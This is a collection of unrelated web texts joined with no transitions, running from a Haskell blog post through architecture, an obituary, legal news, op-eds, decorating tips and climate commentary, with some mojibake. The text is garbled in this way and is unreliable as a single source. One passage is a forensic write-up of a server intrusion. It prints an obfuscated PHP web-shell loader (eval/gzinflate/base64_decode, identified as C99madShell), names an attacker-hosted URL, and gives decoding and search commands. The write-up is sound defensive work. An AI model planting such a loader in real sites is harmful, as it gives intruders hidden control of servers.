There are certainly many , many more implementations , and many more papers , and more ways to tune an implementation than these couple papers spend much time on .
Check out the related work in these papers .
I ’m also pleased , because I feel Haskell has been underrated by the programming populus at large for a long time .**
I ’m interested in becoming more familiar with Haskell largely because of some of my pet peeves with OCaml , and because Haskell ’s type system particulars are both richer and closer to category theory , which interests me mainly as an intellectual curiosity ( and for its relation to type theory in general ) .
Well written Haskell can also beat out many more well - known languages performance - wise ( example , definitely poke around the language shootout ) .
And it ’s always nice to see a real functional language ( read : one in which functional style is the norm , not just an option ) getting mainstream attention .
I can only hope that people continue to take note of Haskell .
* Please note , those of you who are itching to start a flamewar about shared state vs. message passing , that STM does not claim to be the be-all and end - all of concurrent programming .
It is designed to make programming with shared state easier than it is today .
And shared state is not going away , because it ’s the model with which chips are currently designed .
So at the very least , operating systems , compilers , and some runtime systems will still need to deal with it , even if all other development switches to message passing concurrency .
** I should probably mention that I have not used Haskell a great deal , though this is not for lack of desire .
A couple years ago I wrote a short assignment in Haskell ( largely to play with lazy evaluation ) .
I ’ve also spent a fair amount of time writing OCaml over the past couple years , for the course I TAed and head TAed which uses OCaml to introduce students to currying and static typing ( following an introduction to CS with Scheme ) , and last semester in a group software engineering course ( perhaps I ’ll elaborate on this experience another time ) .
So I ’m familiar with a similar type system .

For those that do not know , the above translates to using wget , or the equivalent , to download a script to your system .
With all this being done via Apache and usually from a simple URL designed to exploit a weakness in the given application .
My journey starts here .
Step 1 .
find / - name include.txt
Nothing .
Intruder must have deleted or renamed it .
Step 2 .
Check http://kotzilla.jino-net.ru/include.txt for clues .
<? PHP //Authentication $ login = " " ; // Login $ pass = " " ; // Pass $ md5_pass = " " ; // If no pass then hash eval ( gzinflate ( base64_decode ( ' HJ3HkqN ...[ removed ] ... f/79z/8A' ) ) ) ; ?>
Intruder must think this is clever .
Once you decode and inflate the string , it returns …
eval ( gzinflate ( base64_decode ( '[ another string to decode and inflate ] ' ) ) ) ;
Step 3 .
We do not want to execute any PHP code that is an unknown .
The only option left is to write a PHP script to decode / inflate until we get at the center …
<? php $ string = " eval ( gzinflate ( base64_decode ( ' HJ3HkqN ...[ removed ] ... f/79z/8A' ) ) ) ; " ; $ pattern = ' / ^eval ( gzinflate ( base64_decode ( '( [ ^ ' ) ; ] * ) /' ; $ count = 0 ; while ( preg_match ( $ pattern , $ string , $ matches ) ) { $ count ++ ; $ string = gzinflate ( base64_decode ( $ matches [ 1 ] ) ) ; } echo " Decoded / Inflated : $ countn " ; echo " $ string " ; ?>
Seems to be some type of a web php shell script called C99madShell .
Step 4 .
We need to locate the downloaded script …
find / - name '*. php ' | xargs grep ' eval ( gzinflate ( base64_decode ( '
/.../forums.devside.net/Themes/readme.php:eval(gzinflate(base64_decode(' HJ3Hkq...
Not good !
Step 5 .
Check logs .
grep ' readme.php ' /.../ forums.devside.net/access_log

Final Analysis .
I ’ve search the logs , and I cannot locate anything helpful about the exploit .
It does not seem to be an exploit in a URL , maybe POST related , or has something to do with the SMF theme function .
I run no mods , and use the default theme , and do not allow users to switch themes .
The latest SMF 1.1.4 changelog does not state anything about fixed exploits .

London - based architects Smout Allen and I have a project in the new issue of MAS Context , work originally commissioned for the 2015 Chicago Architecture Biennial and closely related to our project , L.A.T.B.D. , at the University of Southern California Libraries .
Called L.A.
Recalculated , the project looks at Greater Los Angeles as a seismically active and heavily urbanized terrain punctuated by large - scale scientific instrumentation , from geophysics to astronomy .
This is explained in more detail , below .
Between the drawings and the text , it ’s something I ’ve been very enthusiastic about for the past year or so , and I ’m thrilled to finally see it published .
I thus thought I ’d include it here on the blog ; a slightly edited version of the project as seen on MAS Context appears below .
Los Angeles is a city where natural history , aerospace research , astronomical observation , and the planetary sciences hold outsized urban influence .
From the risk of catastrophic earthquakes to the region ’s still operational oil fields , from its long history of military aviation to its complex relationship with migratory wildlife , Los Angeles is not just a twenty - first - century megacity .
Its ecological fragility combined with an unsettling lack of terrestrial stability mean that Los Angeles requires continual monitoring and study : from its buried creeks to its mountain summits , L.A. has been ornamented with scientific equipment , crowned with electromagnetic antennae , and ringed with seismic stations , transforming Los Angeles into an urban - scale research facility , a living device inhabited by millions of people on the continent ’s westernmost edge .
L.A .
Recalculated can be seen as a distributed cartographic drawing — part map , part plan , part section — that takes conceptual inspiration from the book OneFiveFour by Lebbeus Woods .
There , Woods describes a hypothetical city shaped by the existential threat of mysterious seismic events surging through the ground below .
In order to understand how this unstable ground might undermine the metropolis , the city has augmented itself on nearly every surface with “ oscilloscopes , refractors , seismometers , interferometers , and other , as yet unknown instruments , ” he writes , “ measuring light , movement , force , change .
” In this city of instruments — this city as instrument — “ tools for extending perceptivity to all scales of nature are built spontaneously , playfully , experimentally , continuously modified in home laboratories , in laboratories that are homes , ” exploring the moving surface of an Earth in flux .
Architecture becomes a means for giving shape to these existential investigations .
Twenty - first - century Los Angeles has inadvertently fulfilled Woods ’s speculative vision .
It is less a city , in some ways , than it is a matrix of seismic equipment and geological survey tools used for locating , mapping , and mitigating the effects of tectonic faults .
This permanent flux and lack of anchorage means that studying Los Angeles is more bathymetric , we suggest , than it is terrestrial ; it is oceanic rather than grounded .
L.A. is also a graveyard of dead rocket yards and remnant physics experiments that once measured and established the speed of light using prisms , mirrors , and interferometers in the San Gabriel Mountains ( an experiment now marked by historic plaques and concrete obelisks ) .
Further , Los Angeles hosts both the Griffith and Mt. Wilson Observatories through which the region achieved an often overlooked but vital role in the history of global astronomy .
Seen through the lens of this expanded context , Los Angeles becomes an archipelago of scientific instruments often realized at the scale of urban infrastructure : densely inhabited , with one eye on the stars , sliding out of alignment with itself , and jostled from below with seismic tides .
The surface of Los Angeles is both active and porous .
A constant upwelling of liquid hydrocarbons and methane gas is everywhere met with technologies of capture , mitigation , and control .
In our proposal , wheeled seismic creepmeters measure the movement of the Earth as part of an experimental lab monitoring potentially hazardous leaks of oil and tar underground .
The speed of light was accurately measured for the first time just outside this city of sunshine and cinema .
Using complex scientific instrumentation assembled from rotating hexagonal prisms , mirrors , and pulses of light , housed inside small , architecturally insignificant shacks in the mountains behind Los Angeles , one of the fundamental constants of the universe was cracked .
In the heart of the city , atop the old neighborhoods of Chavez Ravine , erased to make way for Dodger Stadium , we propose a series of 360 º planetariums to be built .
These spherical projections not only reconnect Los Angeles with the stars , constellations , and distant galaxies turning through a firmament its residents can now rarely see ; they also allow simulated glimpses into the Earth ’s interior , where the planet ’s constantly rearranging tectonic plates promise a new landscape to come , a deeper world always in formation .
The destroyed houses and streets of this lost neighborhood also reappear in the planetarium shows as a horizon line to remind visitors of the city ’s recent past and possible future .
As the city changes — its demography variable , its landscape forever on the move — so , too , do the constellations high above .
These shifting heavens allow for an always - new celestial backdrop to take hold and influence the city .
A complex architectural zodiac is developed to give a new narrative context for these emerging astral patterns .
Seismic counterweights have long been used to help stabilize skyscrapers in earthquake zones .
Usually found at the tops of towers , these dead weights sway back and forth during temblors like vast and silent bells .
Here , a field of subterranean pendulums has been affixed beneath the city to sway — and counter - sway — with every quake , a kind of seismic anti-doomsday clock protecting the city from destruction .
All of the oil , tar , and liquid asphalt seeping up through the surface of the city can be captured .
In this image , slow fountains attuned to these percolating ground fluids gather and mix the deeper chemistry of Los Angeles in special pools and reservoirs .
The endless jostling of the city , whether due to tectonic activity or to L.A. ’s relentless cycles of demolition and construction , can be tapped as a new source of renewable energy .
Vast flywheels convert seismic disturbance into future power , spinning beneath generation facilities built throughout the city ’s sprawl .
Los Angeles will draw power from the terrestrial events that once threatened it .
Through sites such as Griffith Observatory and the telescopes of Mt. Wilson , the history of Los Angeles is intimately connected to the rise of modern astronomy .
The city ’s widely maligned landscape of freeways and parking lots has been reinvigorated through the precise installation of gates , frames , and other architectural horizon lines , aligning the city with solstices , stars , and future constellations .
L.A. Recalculated was commissioned by the 2015 Chicago Architecture Biennial , with additional support from the USC Libraries Discovery Fellowship , the Bartlett School of Architecture , UCL , and the British Council .
Special thanks to Sandra Youkhana , Harry Grocott , and Doug Miller .
Meanwhile , check out the closely related project , L.A.T.B.D. .
Broadly speaking , L.A.T.B.D. consists of — among many other elements , including narrative fiction and elements of game design — 3D models of the architectural scenarios described by L.A. Recalculated .
Richard Rorty , whose inventive work on philosophy , politics , literary theory and more made him one of the world ’s most influential contemporary thinkers , died Friday in Palo Alto , Calif .
He was 75 .
The cause was complications from pancreatic cancer , said his wife , Mary Varney Rorty .
Raised in a home where “ The Case for Leon Trotsky ” was viewed with the same reverence as the Bible might be elsewhere , Mr. Rorty pondered the nature of reality as well as its everyday struggles .
“ At 12 , I knew that the point of being human was to spend one ’s life fighting social injustice , ” he wrote in an autobiographical sketch .
Russell A. Berman , the chairman of the Department of Comparative Literature at Stanford University , who worked with Mr. Rorty for more than a decade , said , “ He rescued philosophy from its analytic constraints ” and returned it “ to core concerns of how we as a people , a country and humanity live in a political community . ”
Mr. Rorty ’s enormous body of work , which ranged from academic tomes to magazine and newspaper articles , provoked fervent praise , hostility and confusion .
But no matter what even his severest critics thought of it , they could not ignore it .
When his 1979 book “ Philosophy and the Mirror of Nature ” came out , it upended conventional views about the very purpose and goals of philosophy .
The widespread notion that the philosopher ’s primary duty was to figure out what we can and cannot know was poppycock , Mr. Rorty argued .
Human beings should focus on what they do to cope with daily life and not on what they discover by theorizing .

The merits of leaving your wireless access point ( WAP ) open have been discussed and debated at length , especially when it comes to law enforcement .
There is a growing belief that file sharers can protect themselves against lawsuits by keeping their wireless access points open .
The problem is , it wo n't necessarily .
A Texas man who was convicted of possessing child pornography tried to use his open WiFi network as a defense , saying that someone else could have used the same network to traffic in pornographic images .
The US Court of Appeals for the Fifth Circuit did n't buy his argument and upheld the conviction .
Here 's the story : " famclpe , " a Yahoo member using an IP address assigned to Javier Perez in Austin , TX , sent an instant message to a New York woman .
Sent over Yahoo's network , the IM contained a sexually explicit picture of a minor .
The wheels of justice began turning , and after a subpoena was issued , the FBI fingered Perez as the owner of the account in question .
The FBI says it found CDs with child porn in Perez 's room , the only one it searched .
An open - and - shut case ?
No , because there 's a twist : the Yahoo account used to send the message belonged to a Mr. Rob Ram , according to Yahoo 's records .
Perez had a roommate named Robert Ramos and an open WiFi connection , but that was not enough to convince a federal judge to keep the seized CDs from being used in his prosecution .
Perez entered a conditional guilty plea to the charges and received a sentence of four years and nine months .
During his appeal , Perez focused on his open WAP .
Given the fact that anyone within a couple of hundred feet could have been accessing it , it 's impossible to say that the original IM originated from him .
As a result , the search warrant was issued in error , Perez argued , and his conviction should be thrown out .
Open WAP could equal probable cause
A District Court , and now the US Court of Appeals for the Fifth Circuit , disagreed .
In the Appeals Court 's opinion , the judges wrote that the evidence seized in the raid should not have been suppressed .
In particular , they did n't buy Perez 's arguments that a " mere association between an IP address and a physical address is insufficient to establish probable cause " and that the officers ' discovering that he had roommates should have led them to extend their search to cover them .
" In this case it is clear that there was a substantial basis to conclude that evidence of criminal activity would be found at 7608 Scenic Brook Drive , " wrote the Court .
" [ T ] hough it was possible that the transmissions originated outside of the residence to which the IP address was assigned , it remained likely that the source of the transmissions was inside that residence . "
And the big stack of CDs with child pornography on them kind of sealed the deal .
Keeping an open WAP wo n't always keep you off the hook
Open WiFi networks represent a potential maelstrom of scum and villainy , according to some people .
SCO chairman Ralph Yarro recently told the Utah legislature that the state should regulate WiFi networks , even to the point of banning free and unintentionally open networks .
( He 's also the guy who proposed moving porn off of port 80 . )
In cases where people have been arrested for leeching off of an open network , one of the justifications given is the possibility that their freeloader could have been using the free access point for illegal activities .
The " my WiFi network was open " defense has even been raised in the context of filesharing .
If I have an open WAP , the reasoning goes , then no one can pin the file - sharing on me .
That 's a risky strategy , due in no small part to the recording industry 's reliance on IP addresses to identify its targets .
You may be able to demonstrate down the line that it actually was someone else downloading The Carpenters ' Greatest
Hits over your open network , but doing so may prove to be a very expensive proposition .
Suppose you own a Dell computer , and you decide to replace it with a Sony .
You do n’t have to get the permission of your Internet service provider to do so , or even tell the provider about it .
You can just pack up the old machine and set up the new one .
Now , suppose your new computer came with a particular Web browser or online music service , but you ’d prefer a different one .
You can just download and install the new software , and uninstall the old one .
You can sign up for a new music service and cancel the old one .
And , once again , you do n’t need to even notify your Internet provider , let alone seek its permission .
Oh , and the developers of such computers , software and services can offer you their products directly , without going through the Internet provider , without getting the provider ’s approval , and without giving the provider a penny .
The Internet provider gets paid simply for its contribution to the mix : providing your Internet connection .
But , for all practical purposes , it does n’t control what is connected to the network , or carried over the network .
This is the way digital capitalism should work , and , in the case of the mass - market personal - computer industry , and the modern Internet , it has created one of the greatest technological revolutions in human history , as well as one of the greatest spurts of wealth creation and of consumer empowerment .
So , it ’s intolerable that the same country that produced all this has trapped its citizens in a backward , stifling system when it comes to the next great technology platform , the cellphone .
A shortsighted and often just plain stupid federal government has allowed itself to be bullied and fooled by a handful of big wireless phone operators for decades now .
And the result has been a mobile phone system that is the direct opposite of the PC model .
It severely limits consumer choice , stifles innovation , crushes entrepreneurship , and has made the U.S. the laughingstock of the mobile - technology world , just as the cellphone is morphing into a powerful hand - held computer .
Whether you are a consumer , a hardware maker , a software developer or a provider of cool new services , it ’s hard to make a move in the American cellphone world without the permission of the companies that own the pipes .
While power in other technology sectors flows to consumers and nimble entrepreneurs , in the cellphone arena it remains squarely in the hands of the giant carriers .
The Soviet Ministry Model
That ’s why I refer to the big cellphone carriers as the “ Soviet ministries . ”
Like the old bureaucracies of communism , they sit athwart the market , breaking the link between the producers of goods and services and the people who use them .
To some extent , they try to replace the market system , and , like the real Soviet ministries , they are a lousy substitute .
They decide what phones can be used on their networks and what software and services can be offered on those phones .
They require the hardware and software makers to tailor their products to meet the carriers ’ specifications , not just so they work properly on the network , but so they promote the carriers ’ brands and their various add - on services .
Let me be clear :
Any company that spends billions to build and maintain a wireless network deserves to be paid for its use , and deserves to make a profit and a return for its shareholders .
Not only that , but companies like Verizon Wireless or AT&T Inc. should be free to build or sell phones or software or services .
What Is Needed
But , in my view , they should n’t be allowed to pick and choose what phones run on their networks , and what software and services run on those phones .
We need a wireless mobile device ecosystem that mirrors the PC / Internet ecosystem , one where the consumers ’ purchase of network capacity is separate from their purchase of the hardware and software they use on that network .
It will take government action , or some disruptive technology or business innovation , to get us there .
To my knowledge , only one phone maker , Apple Inc. , has been permitted to introduce a cellphone with the cooperation of a U.S. carrier without that carrier having any say in the hardware and software design of the product .
And that one example , the iPhone , was a special case , because Apple is currently the hottest digital brand on earth , with its own multibillion - dollar online and physical retail network .
Even so , Apple had to make a deal with the devil to gain the freedom to offer an unimpaired product directly to users .
It gave AT&T exclusive rights to be the iPhone ’s U.S. network for an undisclosed period of years .
It has locked and relocked the phone to make sure consumers can’t override that restriction .
This arrangement reportedly brings
Apple regular fees from AT&T , but penalizes people who live in areas with poor AT&T coverage .
Apple has also , so far , barred users from installing third - party programs on the iPhone , though the company announced last week it will open the phone to such programs early next year .
( Web - based iPhone programs–those that run inside the Web browser –have been available from day one . )
These restrictions have rubbed some of the luster off the best - designed handheld computer ever made .
A few other “ smart phones ” sold primarily to businesses have been freer of carrier restrictions on third - party software and services than typical cellphones .
But even these handsets , such as Palm Treos , Windows Mobile devices , and BlackBerrys , have been partly crippled by carriers in some cases .
As a technology reviewer , I have met with multiple small companies that had trouble getting their programs onto consumers ’ phones without the permission of the carriers ; getting that permission often requires paying the carriers .
Sure , there are some clumsy workarounds that can evade the carrier barrier , but it ’s nothing like the ability small software companies have had for decades to offer their products for installation on Windows or Macintosh computers .
We also need much greater portability of phone hardware .
Because the federal government failed to set a standard for wireless phone technology years ago , we have two major , incompatible cellphone technologies in the U.S. Verizon Communications Inc. and Sprint Nextel Corp.
use something called CDMA .
AT&T and Deutsche Telekom AG ’s T - Mobile use something called GSM .
Except for a couple of oddball models , phones built for one of these technologies can’t work on the other .
So that limits consumer choice and consumer power .
If you want to switch from AT&T to Verizon , you have to swallow the cost of a new phone .
But the problem is even worse .
The government did n’t require the CDMA companies to include a removable account - information chip , called a SIM card , in their phones .
So , unlike people with GSM phones , Sprint and Verizon customers can’t keep their phones if they switch between the two carriers , even though they use the same basic technology .
And , the government allows the GSM carriers to “ lock ” their phones , so a SIM card from a rival carrier wo n’t work in them , at least for a period of time .
Techies can sometimes figure out how to get around this , but average folks can’t .
The carriers defend these restrictions partly by pointing out that they subsidize the cost of the phones in order to get you to use their networks .
That ’s also , they say , why they require contracts and charge early - termination fees .
Without the subsidies , they say , that $ 99 phone might be $ 299 , so it ’s only fair to keep you from fleeing their networks , at least too quickly .
But this whole cellphone subsidy game is an archaic remnant of the days when mobile phones were costly novelties .
Today , subsidies are a trap for consumers .
If subsidies were removed , along with the restrictions that flow from them , the market would quickly produce cheap phones , just as it has produced cheap , unsubsidized versions of every other digital product , from $ 399 computers to $ 79 iPods .
The Federal Communications Commission is selling some new wireless spectrum that will supposedly lead to fewer restrictions for technology companies and consumers , but it ’s far from certain that the carriers , with their legions of lobbyists and lawyers , will allow such a new day to dawn .
Google Inc. is making noises about trying to bust open the cellphone prison , with new software and services , but that ’s no sure bet either .
Remember Landlines ?
We ’ve been through this before in the U.S. , though many younger readers may not recall it .
Up until the 1970s , when the federal government intervened , you were n’t allowed to buy your own landline phone , and companies were n’t able to innovate , on price or features , in making and selling phones to the public .
All Americans were forced to rent clumsy phones made by a subsidiary of the monopoly phone company , AT&T , which claimed that , unless it controlled what was connected to its network , the network might suffer .
Well , the government pried that market open , and the wired phone network not only did n’t collapse , it became more useful and versatile , allowing , among other things , cheap connections to online data services .
I suspect that if the government , or some disruptive innovation , breaks the crippling power that the wireless carriers exert today , the free market will deliver a similar happy ending .

Santa Cruz , Calif .
A SPATE of news reports have breathlessly announced that science can explain why adults have such trouble dealing with teenagers : adolescents possess “ immature , ” “ undeveloped ” brains that drive them to risky , obnoxious , parent - vexing behaviors .
The latest example is a study out of Temple University that found that the “ temporal gap between puberty , which impels adolescents toward thrill seeking , and the slow maturation of the cognitive - control system , which regulates these impulses , makes adolescence a time of heightened vulnerability for risky behavior . ”
We know the rest of the script : Commentators brand teenagers as stupid , crazy , reckless , immature , irrational and even alien , then advocate tough curbs on youthful freedoms .
Jay Giedd , who heads the brain imaging project at the National Institutes of Health , argues that the voting and drinking ages should be raised to 25 .
Deborah Yurgelun - Todd , a psychiatrist at Harvard Medical School , asks whether we should allow teenagers to be lifeguards or to enlist in the military .
And state legislators around the country have proposed raising driving ages .
But the handful of experts and officials making these claims are themselves guilty of reckless overstatement .
More responsible brain researchers — like Daniel Siegel of the University of California at Los Angeles and Kurt Fischer at Harvard ’s Mind , Brain and Education Program — caution that scientists are just beginning to identify how systems in the brain work .
“ People naturally want to use brain science to inform policy and practice , but our limited knowledge of the brain places extreme limits on that effort , ” Dr. Siegel told me .
“ There can be no ‘ brain - based education ’ or ‘ brain - based parenting ’ at this early point in the history of neuroscience . ”

Photos are one of the best home decorating tools ever .
They ’re personal , unique memories you get to put on display and cherish every day .
But , the best display is n’t always a classic photo frame .
Sometimes it ’s worth thinking outside the box and coming up with eye - catching ways to show off your favorite memories , even if they do seem a little weird at first .
Here are five creative ways to display photos in your home .
1. On Clothespins
Most people assume clothespins belong on laundry lines , but they look good in your home if you know how to use them .
There ’s nothing wrong with hanging a string from one side of a wall to the other then clipping photos with clothespins .
This gives your home a cozy , yet eclectic feel .
The clothespins are definitely not a common household decor item .
But , they look just right once you ’ve put them up and have all your photos clipped in .
2. From String Lights
The clothespins and string approach is great for homes that have a farmhouse , cottage , or shabby chic feel to them .
If you ’re looking for something a bit more elegant , though , swap the traditional string for a set of lights .
This completely changes the look and feel of your photos .
Try to find small , subtle lights that wo n’t take away from your images but rather enhance them .
It ’s also a good idea to print the photos a bit bigger than normal and to clip them with something more subtle than a clothespin .
3. In Homemade Frames
Another interesting photo display option is to make your own frames instead of hanging them in standard photo frames .
This allows your creative freedom to truly shine .
You can go old - school with macaroni and popsicle - stick frames for your child ’s room or make a sophisticated frame with repurposed wood or patterned fabric .
The design is totally up to you .
You ’ll probably have way more fun with this than you think , plus , it ’s an easy way to create a sense of consistency in a room ’s design !
4 . As a Collage
Keep in mind nothing says you absolutely have to frame or hang your photos .
You can also stick them right on the wall and create a collage with them !
If you ’re in a dorm or renting short - term , put your photos on a sheet of poster board paper and cover it completely so the paper ’s color does n’t show .
This makes it much easier to put the collage up then take it down — without ruining your photos or the wall .
5. Blown - Up on the Wall
If you are a homeowner or you see yourself renting somewhere long - term , turn your favorite photo(s ) into wallpaper !
This takes your photo display to the next level .
It ’s a chic , yet fun way to create the look you ’re going for with the personal photos you love most .
You can blow up anything from a landscape shot of your favorite place to a loving family image to be placed somewhere in the home .
Interesting Ways to Display Photos and Other Kinds of Wall Art
Your home ’s decor is not going to change a bit if you ’re just reading about ways to display photos all day !
Get up and start putting some of these suggestions to use .
Before you know it , your home will look like new !

The BBC plans to mark the crucifixion and resurrection of Christ this Easter with an hour - long live procession through the streets of Manchester featuring pop stars from The Stone Roses and Happy Mondays and featuring songs by The Smiths and New Order .
In the programme , called Manchester Passion , a character representing Jesus will sing the legendary Joy Division anthem Love Will Tear Us Apart before dueting his arch - betrayer Judas on the New Order hit Blue Monday , according to senior church sources involved in the production .
Mary Magdelene , the penitent whore of the New Testament , is also getting in on the act : she is being lined up to sing the Buzzcocks hit Ever Fallen in Love ( with Someone You Should n't have ) accompanied by a string band .
Former Happy Monday and Celebrity Big Brother winner Bez will play a disciple .
The climax of the event sees Jesus sing the Smiths classic song Heaven Knows I 'm Miserable Now as he is being flayed by Roman soldiers .
He will then come face - to - face with his Roman prosecutor Pontius Pilate with the two of them singing a duet of the Oasis hit Wonderwall and its chorus :
" I said maybe
You 're gonna be the one who saves me ?
And after all
You 're my wonderwall . "
The broadcaster , which plans to show the event live on BBC3 on Good Friday , insisted the event was inspired by " the way Bach and other composers fused music and the Passion story " .
The " contemporary retelling " of Jesus ' last hours will begin with the messiah - who is yet to be cast - singing the Robbie Williams hit Angels , which will mark his procession into Jerusalem .
In this case , Jerusalem will be represented by Manchester 's gay and red light area near Canal Street and the Passion scene will pass via Chinatown and St Peter 's Square to culminate in Albert Square .
The march will be followed by members of the public who will be encouraged to join in the singing of relevant anthems , which include the M People hit Search for a Hero Inside Yourself .
The crowd will carry a large white cross and the public will also be asked to bring a symbol of their own burden - " something they are personally concerned about " - according to senior church sources involved in the programme .
The crowd will be joined by Bez - the entertainer famous for shaking his maracas on stage with the Happy Mondays .
He will be accompanied by former Stone Roses frontman Ian Brown and Black Grape saxophonist Martin Slattery .
The event will end with the resurrected Jesus singing an as yet undisclosed song from the top of Manchester 's town hall .
The show is being made by the corporation 's classical music television department , which has won plaudits for its experimental music and drama work overseen by its head , Pater Maniura .
These include Flashmob : the Opera - a live opera event staged among commuters at Paddington station in London in which members of the public performed a song inspired by the Orpheus legend - and the forthcoming Riot at the Rite , a dramatisation of the notorious first performance of Stravinsky 's ballet the Rites of Spring , to be aired in March .
While the event is likely to raise eyebrows among more traditional - minded Christians , it has the broad support of both the Church of England and the Roman Catholic Church in the area .
Church of England spokeswoman Gillian Oliver said : " We are working with the BBC on this and are very pleased to be taking the good news of the gospel onto the streets of Manchester .
If anything , something like this can translate the old story into new terms . "
Canon Robin Gamble , canon evangelist at Manchester Cathedral , has been tasked with encouraging churchgoers to attend the event .
" I would n't know a Buzzcock from a ballcock so I could n't really comment on the music .
All I can say is that they are not doing a Christian service , it is a piece of contemporary theatre and that is going to get people to think about the story in modern terms , " he said .
" It is going to come from the streets , with the sounds of traffic and people bustling around and it will make people think about this story in a new way .
It is going to be challenging and shocking and is going to get things rumbling - it 's going to be brilliant . "
A BBC spokeswoman declined to comment on the details of the line - up but promised that the event would be " exciting " .

Oh , for years I denied it .
After all , I have good social skills .
I am not morose or misanthropic .
Usually .
I am far from shy .
I love long conversations that explore intimate thoughts or passionate interests .
But at last I have self - identified and come out to my friends and colleagues .
In doing so , I have found myself liberated from any number of damaging misconceptions and stereotypes .
Now I am here to tell you what you need to know in order to respond sensitively and supportively to your own introverted family members , friends , and colleagues .
Remember , someone you know , respect , and interact with every day is an introvert , and you are probably driving this person nuts .
It pays to learn the warning signs .
What is introversion ?
In its modern sense , the concept goes back to the 1920s and the psychologist Carl Jung .
Today it is a mainstay of personality tests , including the widely used Myers - Briggs Type Indicator .
Introverts are not necessarily shy .
Shy people are anxious or frightened or self - excoriating in social settings ; introverts generally are not .
Introverts are also not misanthropic , though some of us do go along with Sartre as far as to say " Hell is other people at breakfast . "
Rather , introverts are people who find other people tiring .
Extroverts are energized by people , and wilt or fade when alone .
They often seem bored by themselves , in both senses of the expression .
Leave an extrovert alone for two minutes and he will reach for his cell phone .
In contrast , after an hour or two of being socially " on , " we introverts need to turn off and recharge .
My own formula is roughly two hours alone for every hour of socializing .
This is n't antisocial .
It is n't a sign of depression .
It does not call for medication .
For introverts , to be alone with our thoughts is as restorative as sleeping , as nourishing as eating .
Our motto : " I 'm okay , you 're okay — in small doses . "
How many people are introverts ?
I performed exhaustive research on this question , in the form of a quick Google search .
The answer : About 25 percent .
Or : Just under half .
Or — my favorite — " a minority in the regular population but a majority in the gifted population . "
Are introverts misunderstood ?
Wildly .
That , it appears , is our lot in life .
" It is very difficult for an extrovert to understand an introvert , " write the education experts Jill D. Burruss and Lisa Kaenzig .
( They are also the source of the quotation in the previous paragraph . )
Extroverts are easy for introverts to understand , because extroverts spend so much of their time working out who they are in voluble , and frequently inescapable , interaction with other people .
They are as inscrutable as puppy dogs .
But the street does not run both ways .
Extroverts have little or no grasp of introversion .
They assume that company , especially their own , is always welcome .
They cannot imagine why someone would need to be alone ; indeed , they often take umbrage at the suggestion .
As often as I have tried to explain the matter to extroverts , I have never sensed that any of them really understood .
They listen for a moment and then go back to barking and yipping .
Iceland is the leader in a league table judging the European country best able to give citizens a long and happy life .
Estonia comes bottom of the 30 - nation survey while the UK lurks below Romania , at number 21 in the chart .
The European Happy Planet Index used carbon efficiency , life satisfaction and life expectancy to rate the countries .
The survey , published by the New Economics Foundation and Friends of the Earth , reveals that Europe is now worse at creating well - being than it was 40 years ago .
" Countries like Iceland clearly show that happiness does n't have to cost the earth , " said Nic Marks , founder of the foundation 's Centre for Well - being .
" Iceland 's combination of strong social policies and extensive use of renewable energy demonstrates that living within our environmental means does n't mean sacrificing human well - being . "
The Scandinavian countries do best in the survey .
Sweden is second , Norway third and Denmark sixth .
Immediately above Estonia , at the bottom of the table , are Luxembourg , Bulgaria and Greece .
Andrew Simms , the foundation 's head of climate change , said countries with a strong market - led economic model fared least well .
" What is the point if we burn vast quantities of fossil fuels to make , buy and consume ever more stuff , without noticeably benefiting our well - being ? "
Iceland has its own sustainable energy source , via the vulcanic geology , and its government commits more resources to health than any other country in Europe .
Luxembourg is the worst country for its carbon footprint and the UK comes fourth from the bottom on that rating .
Europe as a whole has almost three times its " fair " global share of carbon emissions .
Estonia comes bottom , by having the second highest fear of crime in Europe and a heavy carbon footprint .
Switzerland , fourth overall , has the highest life expectancy , at 80.5 years , while the UK achieves 78.4 and Latvia ranks lowest with 70.7 .
The year was 1987 , Regan was getting his prostate operated on , hair styles were crazy , and fashion was experiencing a dark age .
Something magical , however , did happen that year , and it was n’t the fact that Margaret Thatcher managed to get elected for a third time .
It was the signing of the Montreal Protocol .
The Earthâ€™s ozone layer is on track to heal , thanks to the work of dozens of countries that signed a landmark international environmental agreement initiated 20 years ago .
Known as the Montreal Protocol , this ambitious treaty requires countries to phase out production and use of compounds that deplete ozone in the stratosphere .
Initially signed by 24 countries Sept.16 , 1987 in Montreal , this treaty today covers 191 countries and is widely hailed as the most successful international environmental agreement to date .
“ Twenty years ago , the community of nations came together to adopt a global strategy for the global challenge of ozone depletion .
Today , we at EPA join our international partners in celebrating the anniversary of the Montreal Protocol â€ “ a shining example of how human ingenuity , leadership and determination can create a healthier , better world , ” said EPA Administrator Stephen L. Johnson .
Each of the countries that signed the Protocol has measurable goals and actions for achieving success .
These include phasing out production and use of ozone - depleting substances such as chlorofluorocarbons , halons , carbon tetrachloride , and methyl chloroform .
Scientific evidence demonstrates that these compounds significantly deplete the stratospheric ozone layer , which shields the planet from damaging ultraviolet radiation .
The United States has implemented key parts of the Montreal Protocol more rapidly and at significantly less cost than originally anticipated .
With the help of many partners , EPA has also approved more than 300 alternatives to ozone - depleting substances for industrial , commercial , and consumer uses .
Many of these new technologies also save energy and reduce emissions of greenhouse gases .
As a result of U.S. efforts combined with those worldwide to phase out ozone depleting substances , the ozone layer has not grown thinner since 1998 over most of the world .
Antarctic ozone is projected to return to pre-1980 levels around 2060 to 2075 .
EPA estimates that between 1990 and 2165 , an estimated 6.3 million U.S. lives will be saved as a result of these international actions to protect and restore the ozone layer .
Sept. 16 , 2007 , is International Ozone Day and marks the 20th Anniversary of the signing of the Montreal Protocol .
The United States and various partner countries around the world are meeting in Montreal to discuss the importance of continuing the progress made to protect the ozone layer , and to celebrate the important achievements of the past 20 years and the people and programs that work to protect the Earthâ€™s ozone layer .
This stunning success is like a large mirror held up to the current state of things like the Kyoto protocol , and other international treaties to help stop global warming .
The Montreal Protocol prevented us from a future of wide spread skin cancer , crop failure , or worse .
People got together , formulated a plan , agreed to it , and put it in action .
As such we can still go outside without a foil hazmat suite .
Global warming is if anything even more serious that Ozone depletion , and the only way to solve it is to once again come together and work as a world community .
Unfortunately we have been , lets say , not that diplomatic as of late .
Starting wars , and the like is no way to get the world to work with you .
That does n’t mean that things ca n’t change .
A new foreign policy , a new environmental outlook , a new congress , a new president , and we are right back in this fight .
The choices we make have a lot to do with the fate of the world .
Choose carefully .
It took Dan Frazier a long time to figure out how to make a living .
He cared for a quadriplegic .
He sold health food from the back of his bicycle .
He drove a van for disabled people .
Then , after years of drifting from job to job , Frazier turned to the Internet .
Marrying his politics and entrepreneurial instincts , he began selling left - leaning bumper stickers .
